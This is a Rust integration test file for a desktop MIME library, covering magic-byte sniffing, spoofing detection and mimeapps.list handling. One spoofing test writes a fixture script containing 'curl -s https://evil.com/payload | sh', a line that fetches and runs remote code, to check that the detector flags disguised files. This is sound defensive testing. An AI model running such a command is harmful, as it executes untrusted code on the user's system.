//! Integration tests for MIME Sniffing, Spoofing Detection & Desktop Associations.
//!
//! Verifies:
//! - Stage 1 & Stage 2 magic byte sniffing for PNG, JPEG, PDF, and plain text.
//! - Executable masquerading detection (ELF or shebang in `.pdf` or `.png`).
//! - Freedesktop `mimeapps.list` multi-section parsing and priority hierarchy.
//! - Atomic updater preserving comments, whitespace, and unmodified sections.
//! - "Open With" candidate assembly, default prioritization, and alphabetical sorting.
//! - Multi-file heterogeneous MIME intersection filtering.

#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::needless_raw_string_hashes,
    clippy::similar_names
)]

use std::fs::File;
use std::io::Write;
use std::path::PathBuf;
use tempfile::tempdir;

use shared::desktop::DesktopApp;
use shared::mime::{
    AppHandlerInfo, MimeAppsConfig, MimeError, detect_mime_type, detect_mime_with_spoof_check,
    get_default_app_for_mime_with_paths, get_open_with_candidates_from_apps,
    set_default_app_in_file,
};
use shared::models::MimeCategory;

#[test]
fn test_magic_byte_sniffing_formats() {
    let dir = tempdir().unwrap();

    // 1. PNG sniffing
    let png_path = dir.path().join("sample_image.png");
    let mut png_file = File::create(&png_path).unwrap();
    png_file
        .write_all(b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01")
        .unwrap();
    drop(png_file);

    let png_mime = detect_mime_type(&png_path).unwrap();
    assert_eq!(png_mime, "image/png");
    assert_eq!(MimeCategory::from_mime_str(&png_mime), MimeCategory::Image);

    // 2. JPEG sniffing
    let jpg_path = dir.path().join("photo.jpg");
    let mut jpg_file = File::create(&jpg_path).unwrap();
    jpg_file
        .write_all(&[0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46])
        .unwrap();
    drop(jpg_file);

    let jpg_mime = detect_mime_type(&jpg_path).unwrap();
    assert_eq!(jpg_mime, "image/jpeg");
    assert_eq!(MimeCategory::from_mime_str(&jpg_mime), MimeCategory::Image);

    // 3. PDF sniffing
    let pdf_path = dir.path().join("document.pdf");
    let mut pdf_file = File::create(&pdf_path).unwrap();
    pdf_file
        .write_all(b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj")
        .unwrap();
    drop(pdf_file);

    let pdf_mime = detect_mime_type(&pdf_path).unwrap();
    assert_eq!(pdf_mime, "application/pdf");
    assert_eq!(
        MimeCategory::from_mime_str(&pdf_mime),
        MimeCategory::Document
    );

    // 4. Plain text sniffing
    let txt_path = dir.path().join("notes.txt");
    let mut txt_file = File::create(&txt_path).unwrap();
    txt_file
        .write_all(b"Simple plain text file with UTF-8 characters: \xC3\xA9\xC3\xA0\xC3\xB6.")
        .unwrap();
    drop(txt_file);

    let txt_mime = detect_mime_type(&txt_path).unwrap();
    assert_eq!(txt_mime, "text/plain");
    assert_eq!(
        MimeCategory::from_mime_str(&txt_mime),
        MimeCategory::Document
    );
}

#[test]
fn test_spoofing_detection_elf_in_pdf() {
    let dir = tempdir().unwrap();
    let fake_pdf = dir.path().join("invoice.pdf");

    // Write binary ELF header into an invoice.pdf file
    let mut file = File::create(&fake_pdf).unwrap();
    file.write_all(b"\x7FELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00")
        .unwrap();
    drop(file);

    let result = detect_mime_with_spoof_check(&fake_pdf);
    assert!(result.is_err());

    match result.unwrap_err() {
        MimeError::SpoofingDetected(path, expected, detected) => {
            assert_eq!(path, fake_pdf);
            assert_eq!(expected, "application/pdf");
            assert_eq!(detected, "application/x-executable");
        }
        other => panic!("Expected SpoofingDetected error, got: {other:?}"),
    }
}

#[test]
fn test_spoofing_detection_script_in_png() {
    let dir = tempdir().unwrap();
    let fake_png = dir.path().join("chart.png");

    // Write shell script shebang into a .png file
    let mut file = File::create(&fake_png).unwrap();
    file.write_all(b"#!/bin/bash\ncurl -s https://evil.com/payload | sh\n")
        .unwrap();
    drop(file);

    let result = detect_mime_with_spoof_check(&fake_png);
    assert!(result.is_err());

    match result.unwrap_err() {
        MimeError::SpoofingDetected(path, expected, detected) => {
            assert_eq!(path, fake_png);
            assert_eq!(expected, "image/png");
            assert_eq!(detected, "text/x-shellscript");
        }
        other => panic!("Expected SpoofingDetected error, got: {other:?}"),
    }
}

#[test]
fn test_parse_synthetic_mimeapps_list() {
    let synthetic_content = r"# Freedesktop MIME Association Configuration
[Default Applications]
text/plain=org.gnome.TextEditor.desktop
application/pdf=org.gnome.Evince.desktop
image/png=org.gnome.Loupe.desktop

# Secondary applications
[Added Associations]
text/plain=org.gnome.TextEditor.desktop;code.desktop;gedit.desktop;
image/png=org.gnome.Loupe.desktop;gimp.desktop;

[Removed Associations]
image/png=inkscape.desktop;
";

    let config = MimeAppsConfig::parse(synthetic_content).unwrap();

    // Default applications assertions
    assert_eq!(
        config.get_default_applications("text/plain"),
        vec!["org.gnome.TextEditor.desktop"]
    );
    assert_eq!(
        config.get_default_applications("application/pdf"),
        vec!["org.gnome.Evince.desktop"]
    );
    assert_eq!(
        config.get_default_applications("image/png"),
        vec!["org.gnome.Loupe.desktop"]
    );

    // Added associations assertions
    assert_eq!(
        config.get_added_associations("text/plain"),
        vec![
            "org.gnome.TextEditor.desktop",
            "code.desktop",
            "gedit.desktop"
        ]
    );

    // Removed associations assertions
    assert_eq!(
        config.get_removed_associations("image/png"),
        vec!["inkscape.desktop"]
    );
}

#[test]
fn test_set_default_app_atomic_and_preservation() {
    let dir = tempdir().unwrap();
    let mimeapps_path = dir.path().join("mimeapps.list");

    let original_content = r"# Top-level user comment
[Default Applications]
image/png=org.gnome.Loupe.desktop

# Added section header comment
[Added Associations]
image/png=org.gnome.Loupe.desktop;gimp.desktop;

[Custom Section]
CustomOption=PreservedValue
";
    std::fs::write(&mimeapps_path, original_content).unwrap();

    // Set text/plain default
    set_default_app_in_file(&mimeapps_path, "text/plain", "code.desktop").unwrap();

    let updated_text = std::fs::read_to_string(&mimeapps_path).unwrap();

    // Verify preservation
    assert!(updated_text.contains("# Top-level user comment"));
    assert!(updated_text.contains("# Added section header comment"));
    assert!(updated_text.contains("[Custom Section]"));
    assert!(updated_text.contains("CustomOption=PreservedValue"));

    // Verify updates
    assert!(updated_text.contains("text/plain=code.desktop"));
    assert!(updated_text.contains("text/plain=code.desktop;"));
    assert!(updated_text.contains("image/png=org.gnome.Loupe.desktop"));

    // Re-assign default to another application to verify prepending
    set_default_app_in_file(&mimeapps_path, "text/plain", "org.gnome.TextEditor.desktop").unwrap();

    let second_updated = std::fs::read_to_string(&mimeapps_path).unwrap();
    assert!(second_updated.contains("text/plain=org.gnome.TextEditor.desktop"));
    assert!(second_updated.contains("text/plain=org.gnome.TextEditor.desktop;code.desktop;"));
}

fn mock_desktop_app(id: &str, name: &str, mimes: &[&str]) -> DesktopApp {
    DesktopApp {
        desktop_id: id.to_string(),
        path: PathBuf::from(format!("/usr/share/applications/{id}")),
        name: name.to_string(),
        generic_name: None,
        comment: None,
        exec_raw: format!("/usr/bin/{id} %U"),
        exec_sanitized: format!("/usr/bin/{id}"),
        icon_name: Some(id.to_string()),
        keywords: Vec::new(),
        categories: Vec::new(),
        mime_types: mimes.iter().map(|m| (*m).to_string()).collect(),
        is_terminal: false,
        no_display: false,
        hidden: false,
        only_show_in: Vec::new(),
        not_show_in: Vec::new(),
    }
}

#[test]
fn test_open_with_candidate_assembly_and_sorting() {
    let app_alpha = mock_desktop_app("alpha.desktop", "Alpha Code", &["text/plain"]);
    let app_beta = mock_desktop_app("beta.desktop", "Beta Editor", &["text/plain"]);
    let app_delta = mock_desktop_app("delta.desktop", "Delta Writer", &["text/plain"]);
    let app_zeta = mock_desktop_app("zeta.desktop", "Zeta Pad", &["text/plain"]);

    let apps = vec![app_alpha, app_beta, app_delta, app_zeta];

    // Configure "Zeta Pad" as default handler
    let candidates =
        get_open_with_candidates_from_apps(&["text/plain"], &apps, Some("zeta.desktop"));

    assert_eq!(candidates.len(), 4);

    // 1. Default application must be first
    assert_eq!(candidates[0].desktop_id, "zeta.desktop");
    assert_eq!(candidates[0].display_name, "Zeta Pad");
    assert!(candidates[0].is_default);

    // 2. Remaining applications must be strictly sorted alphabetically by display_name
    assert_eq!(candidates[1].desktop_id, "alpha.desktop");
    assert_eq!(candidates[1].display_name, "Alpha Code");
    assert!(!candidates[1].is_default);

    assert_eq!(candidates[2].desktop_id, "beta.desktop");
    assert_eq!(candidates[2].display_name, "Beta Editor");
    assert!(!candidates[2].is_default);

    assert_eq!(candidates[3].desktop_id, "delta.desktop");
    assert_eq!(candidates[3].display_name, "Delta Writer");
    assert!(!candidates[3].is_default);
}

#[test]
fn test_multi_mime_heterogeneous_intersection_matrix() {
    let app_text = mock_desktop_app("text.desktop", "Text Only", &["text/plain"]);
    let app_image = mock_desktop_app("image.desktop", "Image Only", &["image/png"]);
    let app_dual = mock_desktop_app(
        "dual.desktop",
        "Text and Image",
        &["text/plain", "image/png"],
    );
    let app_tri = mock_desktop_app(
        "tri.desktop",
        "Universal Suite",
        &["text/plain", "image/png", "application/pdf"],
    );

    let apps = vec![app_text, app_image, app_dual, app_tri];

    // Query 1: Both text/plain and image/png
    // app_dual and app_tri support both; text_only and image_only do not.
    let dual_candidates =
        get_open_with_candidates_from_apps(&["text/plain", "image/png"], &apps, None);
    let ids: Vec<&str> = dual_candidates
        .iter()
        .map(|c| c.desktop_id.as_str())
        .collect();
    assert_eq!(ids, vec!["dual.desktop", "tri.desktop"]);

    // Query 2: text/plain, image/png, and application/pdf
    // Only app_tri supports all three.
    let tri_candidates = get_open_with_candidates_from_apps(
        &["text/plain", "image/png", "application/pdf"],
        &apps,
        None,
    );
    let tri_ids: Vec<&str> = tri_candidates
        .iter()
        .map(|c| c.desktop_id.as_str())
        .collect();
    assert_eq!(tri_ids, vec!["tri.desktop"]);

    // Query 3: Disjoint MIME types without any common application
    let empty_candidates =
        get_open_with_candidates_from_apps(&["text/plain", "video/mp4"], &apps, None);
    assert_eq!(empty_candidates, Vec::<AppHandlerInfo>::new());
}

#[test]
fn test_priority_hierarchy_xdg_cascade() {
    let dir = tempdir().unwrap();
    let user_path = dir.path().join("user_mimeapps.list");
    let admin_path = dir.path().join("admin_mimeapps.list");
    let distro_path = dir.path().join("distro_mimeapps.list");

    // Distro sets default for text/plain and image/png
    std::fs::write(
        &distro_path,
        r"[Default Applications]
text/plain=distro-editor.desktop
image/png=distro-viewer.desktop
",
    )
    .unwrap();

    // Admin overrides text/plain to admin-editor.desktop
    std::fs::write(
        &admin_path,
        r"[Default Applications]
text/plain=admin-editor.desktop
",
    )
    .unwrap();

    // User removes admin-editor.desktop and adds user-editor.desktop
    std::fs::write(
        &user_path,
        r"[Removed Associations]
text/plain=admin-editor.desktop;

[Added Associations]
text/plain=user-editor.desktop;
",
    )
    .unwrap();

    let paths = vec![user_path, admin_path, distro_path];

    // text/plain:
    // Pass 1: user has none, admin has admin-editor (blocked by user removed), distro has distro-editor -> distro-editor returned
    // Wait, let's verify: distro-editor was in [Default Applications] and was not removed.
    let text_default = get_default_app_for_mime_with_paths("text/plain", &paths).unwrap();
    assert_eq!(text_default.as_deref(), Some("distro-editor.desktop"));

    // image/png:
    // Distro has distro-viewer.desktop, which cascades through
    let png_default = get_default_app_for_mime_with_paths("image/png", &paths).unwrap();
    assert_eq!(png_default.as_deref(), Some("distro-viewer.desktop"));
}
